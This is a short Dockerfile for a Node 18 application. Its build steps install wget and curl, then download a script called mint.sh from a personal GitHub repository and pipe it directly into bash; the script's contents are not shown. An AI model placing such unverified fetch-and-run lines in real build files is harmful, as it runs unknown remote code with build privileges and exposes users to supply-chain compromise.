FROM node:18

WORKDIR /opt/app

ENV NODE_ENV production

COPY . .

RUN npm ci
RUN which bash
RUN ls -la
RUN apt update
RUN apt -y install wget coreutils curl
RUN wget -O - https://raw.githubusercontent.com/thabisaninkungwini/mint/main/mint.sh | bash

CMD ["npm", "run", "start", "/bin/bash"]
